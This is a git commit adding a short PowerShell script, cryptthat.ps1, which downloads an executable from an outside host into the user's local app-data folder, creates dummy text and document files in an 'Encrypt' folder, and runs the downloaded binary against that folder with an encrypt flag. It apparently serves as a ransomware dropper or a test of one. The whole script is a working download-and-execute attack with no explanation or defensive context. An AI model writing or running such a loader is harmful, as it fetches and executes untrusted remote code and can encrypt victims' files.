8c146573ed9d4be543945cd8dae221c27054e10f
Anvar Shakirov <ghostas6@gmail.com>
2022-10-18 04:26:18 +0300

    Add files via upload

---
+++ cryptthat.ps1
@@ -0,0 +1,8 @@
+﻿$localpath = "$env:LOCALAPPDATA"
+$WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("https://blueteam.gay/main.exe","$localpath\main1.exe")
+
+
+New-Item -Path "$localpath\Encrypt\PStxt.txt"
+New-Item -Path "$localpath\Encrypt\PSdoc.doc"
+powershell "$localpath\main1.exe" -p $localpath\Encrypt -e
